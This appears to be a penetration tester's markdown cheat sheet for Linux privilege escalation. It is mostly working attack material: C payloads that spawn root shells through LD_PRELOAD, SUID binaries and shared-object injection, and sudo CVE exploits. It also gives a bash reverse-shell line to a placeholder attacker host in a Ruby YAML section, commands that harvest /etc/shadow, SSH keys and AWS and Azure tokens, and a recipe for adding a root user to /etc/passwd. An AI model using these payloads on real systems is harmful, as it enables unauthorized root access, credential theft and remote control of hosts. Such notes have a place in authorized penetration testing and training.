  
# Linux Host Enumeration   
## Contents 
- [Linux Host Enumeration](#linux-host-enumeration)
  * [Contents](#contents)
  * [Checklist](#checklist)
  * [Upgrade to a fully functional TTY](#upgrade-to-a-fully-functional-tty)
    + [Check](#check)
    + [Upgrade](#upgrade)
  * [Quick Enumeration Commands](#quick-enumeration-commands)
    + [Important Files to Check](#important-files-to-check)
  * [File Transfer](#file-transfer)
  * [Scripts](#scripts)
    + [General Linux Enum](#general-linux-enum)
    + [Specialized Scripts](#specialized-scripts)
  * [Sudo exploits](#sudo-exploits)
  * [Sudo LD_PRELOAD](#sudo-ld-preload)
  * [CVE-2019-14287](#cve-2019-14287)
  * [CVE-2019-16634 Buffer Overflow](#cve-2019-16634-buffer-overflow)
  * [CVE-2021-3156 - Baron Samedit Heap Buffer Overflow](#cve-2021-3156---baron-samedit-heap-buffer-overflow)
  * [Misc sudo binaries](#misc-sudo-binaries)
  * [Cronjobs](#cronjobs)
  * [PATH variable](#path-variable)
    + [Rootbash script](#rootbash-script)
    + [Wildcards](#wildcards)
  * [SUID Binaries](#suid-binaries)
    + [Custom Executable](#custom-executable)
    + [Shared Object Injection](#shared-object-injection)
    + [PATH Enviromental Variables](#path-enviromental-variables)
    + [SUID Binary Function Replace](#suid-binary-function-replace)
    + [Misc SUID binaries](#misc-suid-binaries)
  * [Services Running as Root / Services Only Running Locally](#services-running-as-root---services-only-running-locally)
  * [Passwords / config files](#passwords---config-files)
    + [Writeable /etc/passwd or /etc/shadow](#writeable--etc-passwd-or--etc-shadow)
    + [SSH Keys](#ssh-keys)
  * [Capabilities](#capabilities)
  * [Container Escapes](#container-escapes)
  * [NFS No Root Squashing](#nfs-no-root-squashing)
  * [Sequoia (CVE-2021-33909)](#sequoia--cve-2021-33909-)
  * [Kernel Exploits](#kernel-exploits)
    + [Cross compile](#cross-compile)
  * [Further Access into a Network](#further-access-into-a-network)
    + [Network Enumeration](#network-enumeration)
- [Resources](#resources)
  * [Learn More](#learn-more)


## Checklist
- [ ] Get a fully functional TTY  
- [ ] General host enum 
- [ ] Transfer files and run scripts 
- [ ] Sudo exploits   
- [ ] Exploitable cronjobs 
- [ ] SUID/SGID binaries  
- [ ] Services (running as root, only available to localhost)  
- [ ] Passwords / config files 
- [ ] Binaries with exploitable capabilities 
- [ ] NFS No root squashing  
- [ ] Container escapes 
- [ ] Is the kernel vulnerable  (last resort priv esc) 
- [ ] Further access into the network / post exploitation 

[Tiberius Linux Privilige Escalation](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux.rst)     
[PayloadAllTheThings Linux Priv Esc Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)   

[Linux Explain Shell](https://www.explainshell.com/)   
[Static Binaries](https://github.com/andrew-d/static-binaries)  

## Upgrade to a fully functional TTY 
### Check 
    if [ -t 1 ] ; then echo terminal; else echo "not a terminal"; fi 
    
### Upgrade 
    python -c 'import pty;pty.spawn("/bin/bash")' 
    echo os.system('/bin/bash') 
    /bin/sh -i 
    
[Gaining TTY](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/gaining-tty.rst)  
[Breaking out of shellcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)   
[Restricted Shell Bypass](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)   
 

## Quick Enumeration Commands  
    hostname; ip addr;    
    whoami; id     #prints your EUID / ID   
    who     #logged in users  
    uname -r   
    cat /etc/*-release   
    su -, su root (no password, root, password) 
    sudo -l  
    ps -aux | grep root 
    netstat -antp   

Installed apps 

    ls -lh /usr/bin/
    ls -lh /sbin/
    rpm -qa     #all packages installed on RPM based Linux system   
    dpkg -l     #all packages on Debian based Linux   
### Important Files to Check 
    cat /etc/passwd | grep /bin/bash   
    ls -al /etc/shadow       #crack with hashcat -m 1800  
    ls -al /etc/passwd   
    /etc/group  
    /etc/sudoers
    /etc/hosts               #local DNS entries 
    
## File Transfer 
    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
    
## Scripts   
### General Linux Enum 
run [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) with increasing run levels
[linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
[linenum](https://github.com/rebootuser/LinEnum) 
[unix-privesc-cecker](https://github.com/pentestmonkey/unix-privesc-check)   
[Lin Priv Checker](https://github.com/linted/linuxprivchecker) 

### Specialized Scripts    
Verify web app is running in a Docker container - look for .dockerenv file in root of filesystem.     
[Docker and Container escapes - DEEPCE](https://github.com/stealthcopter/deepce)   
[SUDO Killer: sudo exploits](https://github.com/TH3xACE/SUDO_KILLER)  
[Uptux - Specialized priv esc checks](https://github.com/initstring/uptux) 

## Sudo exploits 
[SUDO_KILLER enum script](https://github.com/TH3xACE/SUDO_KILLER)  

sudo -l, cat /etc/sudoers, check gtfobins  
sudo -V    
## Sudo LD_PRELOAD   
[Reference](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) 
sudo -l, see env_keep+=LD_PRELOAD. apache2

    #include <stdio.h> 
    #include <sys/types.h>
    #include <stdlib.h>
    void _init(){
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
    } 
    
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c 

sudo LD_PRELOAD=/tmp/preload.so [sudo binary] 

## CVE-2019-14287 
Sudo versions < 1.8.28. Sees -1 and reads as 0 (UID of root) 

sudo -l, see (ALL,!root)  

    sudo -u#-1 [binary escape]  
    
## CVE-2019-16634 Buffer Overflow 
versions of sudo earlier than 1.8.26  
sudo su root, type password, see ******: pwfeedback enabled in /etc/sudoers. Buffer overflow attack against password feedback.   

[exploit](https://github.com/saleemrashid/sudo-cve-2019-18634)  

## CVE-2021-3156 - Baron Samedit Heap Buffer Overflow 
[Qualys blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)  
[poc 2](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156)   
[exploit](https://github.com/blasty/CVE-2021-3156)  

any unpatched version of the sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1

    sudoedit -s '\' $(python3 -c 'print("A"*1000)')                  #check to see if machine is exploitable 

## Misc sudo binaries  
nmap 

    echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse  
apache2

    sudo apache2 -f /etc/shadow    
    
# Code Execution Through Yaml Using Ruby   
See this guide: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ruby-privilege-escalation/    
$ sudo -l     
Matching Defaults entries for user on x:    
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin      

User may run the following commands on x:   
    (root) NOPASSWD: /usr/bin/ruby /sample.rb   

def list_from_file   
    YAML.load(File.read("dependencies.yml"))    
End   


 git_set:"bash -c 'bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1'"    
 git_set: "chmod +s /bin/bash"    



## Cronjobs    
look for scripts you can write to running as a cronjob, writeable cron directory/crontab, writeable PATH directories used, wildcard expansion 

    cat /etc/crontab  
    crontab -l    
    ls -al /etc/cron* 
### PATH variable 
If a cronjob doesn’t use an absolute path and one of path dirs is writable by user: can create a script with the same name as the cron job so it is executed. 
default /usr/bin:/bin 

    echo $PATH 
    cat /etc/crontab     
### Rootbash script 
    #!/bin/bash 
    cp /bin/bash /tmp/rootbash 
    chmod +s /tmp/rootbash 
### Wildcards 
[Exploiting wildcards in Linux](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) 

## SUID Binaries 
Overwrite binary, use [gtfobins](https://gtfobins.github.io/) exploits, insert missing shared object, manipulate enviromental variables 

    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2>/dev/null     
    find / -type f -a -perm -o+x -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null  
    
### Custom Executable
    int main(){
        setuid(0);
        system("/bin/bash -p");
    }  
### Shared Object Injection 
look for missing shared objects searched for in writable directories 

    strace [suid binary] 2>&1 | grep -iE “open|access|no such file” 
    [missing shared object].c  
    
    #include <stdio.h> 
    #include <stdlib.h> 
    static void inject() __attribute__((constructor));  
    void inject(){ 
     setuid(0); 
     system("/bin/bash -p"); 
    } 
    
    gcc -shared -fPIC -o [missing shared object].so [missing shared object].c 
    run suid binary 
### PATH Enviromental Variables 
SUID /SGID binary tries to execute another file without absolute path? -> change PATH var 

    strings [suid binary] 
    strace -v -f -e execve [suid binary] 2>&1 | grep exec 
    ltrace [suid binary]  
    
compile custom executable with name of file suid binary is calling
set PATH variable to current directory and run suid binary  

    PATH=.:$PATH /usr/local/bin/suid-env
### SUID Binary Function Replace  
    strings /usr/local/bin/suid-env2  
    
    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p' 
    
### Misc SUID binaries 
use binary to exec /bin/bash -p 

    pkexec --user root /bin/sh  
## Services Running as Root / Services Only Running Locally
    ps -aux | grep root 
    netstat -etulp 
    mysql running as root [exploit](https://www.exploit-db.com/exploits/1518)  
    ftp, telnet - tcpdump to sniff creds??
## Passwords / config files 
    /etc/passwd, /etc/shadow, /etc/sudoers  read or write?? 
    cat ~/.ssh  
    cat ~/.*history | grep -i passw    #check .bash_history, .mysql_history 
    last -f /var/log/btmp    #failed logins, look for password as username    
    cat /home/*/.aws/credentials   #AWS creds       
    cat /home/*/.azure/accessTokens.json    #Azure login token    
    
search for strings (search for username if scripts aren't picking up creds):

    grep -rwl "password" /var     
    find . -iname 'config' -type f    #find config files     

   
### Writeable /etc/passwd or /etc/shadow

    openssl passwd -1 -salt [username] [password]

Append to /etc/passwd or /etc/shadow

    Username:encrypted_password:UID:GUID:root:/root:/bin/bash

### SSH Keys   
    find / -name authorized_keys 2> /dev/null
    find / -name id_rsa 2> /dev/null   

## Capabilities 
check gtfobins, [capabilities reference](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities) 

    getcap -r / 2>/dev/null  
    getcap /usr/bin/binary   
 Also check for special permissions:    
 
    ls -l /usr/bin/binary   
    lsattr /usr/bin/binary   
    
## Container Escapes 
docker, lxd, 
[Docker and Container escapes - DEEPCE](https://github.com/stealthcopter/deepce)   
[Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)    
[Docker for pen testers](https://blog.ropnop.com/docker-for-pentesters/)   

    docker ps -a 

## NFS No Root Squashing   
Allows you to mount drive onto attack box, create a SUID binary that you can run on the victim.  

    cat /etc/exports     
    showmount -e [victim ip]   
    mount -o rw,vers=2 [victim ip]:/mntFolder /mntFolder/tmp   

## Sequoia (CVE-2021-33909)  
[Qualys blog post](https://blog.qualys.com/vulnerabilities-threat-research/2021/07/20/sequoia-a-local-privilege-escalation-vulnerability-in-linuxs-filesystem-layer-cve-2021-33909)  


## Kernel Exploits 
[Linux Kernel CVEs Site](https://www.linuxkernelcves.com/cves) 

    uname -a  
    cat /etc/*-release
    
### Cross compile 
No compilers on host: use gcc-multilib -m32 (32 bit OS) or -m64 (64 bit OS) then upload   

    gcc -m32 -o output32 exploit.c     #(32 bit) 
    gcc -m64 -o output exploit.c       #(64 bit)  
    
## Further Access into a Network 
### Network Enumeration 
    netstat -antp; arp -a 
    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " " 
    cat /etc/hosts  

# Resources 
## Learn More 
[Hacktricks Linux Privilige Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)      
[Local Priv Esc workshop](https://github.com/sagishahar/lpeworkshop)      
[Basic Linux Priv Esc](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics)     
[A Guide to Linux Privilige Escalation](https://payatu.com/guide-linux-privilege-escalation)   
[g0tm1lk checklist](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)     
[Linux elevation of privileges ToC](https://guif.re/linuxeop)       
[Linux Enumeration](https://zweilosec.gitbook.io/hackers-rest/linux-1/linux-redteam/enumeration) 

